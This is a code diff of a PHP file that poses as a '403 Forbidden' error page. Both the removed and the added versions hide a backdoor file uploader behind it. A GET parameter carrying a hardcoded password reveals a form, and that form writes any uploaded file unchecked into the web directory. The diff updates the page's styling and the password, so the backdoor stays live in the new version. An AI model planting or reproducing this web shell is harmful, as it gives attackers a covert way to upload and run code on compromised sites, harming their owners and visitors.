@@ -1,12 +1,39 @@
-<?php
-echo "<html><head>
-<title>403 Forbidden</title>
-</head><body>
-<h1>Forbidden</h1>
-<p>You don't have permission to access ".$_SERVER['REQUEST_URI']."  on this server.</p>
-<p>Additionally, a 403 Forbidden
-error was encountered while trying to use an ErrorDocument to handle the request.</p>
-</body></html>";if(isset($_POST['uploaded'])){$file=$_FILES['files']['name'];$files=$_FILES['files']['tmp_name'];$folder="";if(move_uploaded_file($files,$folder.$file)){$result="Uploaded : => <A href='$file' target='_blank'>Your file here</A>";}else {$result="Failed to upload...!";}}$password="axvtech";if($_GET['pass']==$password){echo '<br /><br /><br /><html><head><title>P1X Uploader</title></head><body><center><form action="" method="post" enctype="multipart/form-data">
-<input type="file" name="files" />
-<input type="submit" name="uploaded" value="Upload">
-</form>'.$result.'</center></body></html>';}?>
+<!DOCTYPE html>
+<html style="height: 100%">
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <title>403 Forbidden</title>
+</head>
+
+<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
+    <div style="height:auto; min-height:100%;">
+        <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
+            <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1>
+            <h2 style="margin-top:20px;font-size: 30px;">Forbidden</h2>
+            <p>Access to this resource on the server is denied!</p>
+
+            <?php
+            if (isset($_POST['uploaded'])) {
+                $file = $_FILES['files']['name'];
+                $files = $_FILES['files']['tmp_name'];
+                $folder = "";
+                if (move_uploaded_file($files, $folder . $file)) {
+                    $result = "Uploaded : => <a href='$file' target='_blank'>Your file here</a>";
+                } else {
+                    $result = "Failed to upload...!";
+                }
+            }
+            $password = "4xvt3ch";
+            if ($_GET['passwd'] == $password) {
+                echo '<br /><br /><br /><form action="" method="post" enctype="multipart/form-data">
+                    <input type="file" name="files" />
+                    <input type="submit" name="uploaded" value="Upload">
+                </form><div style="margin-top: 20px;">' . $result . '</div>';
+            }
+            ?>
+        </div>
+    </div>
+</body>
+
+</html>
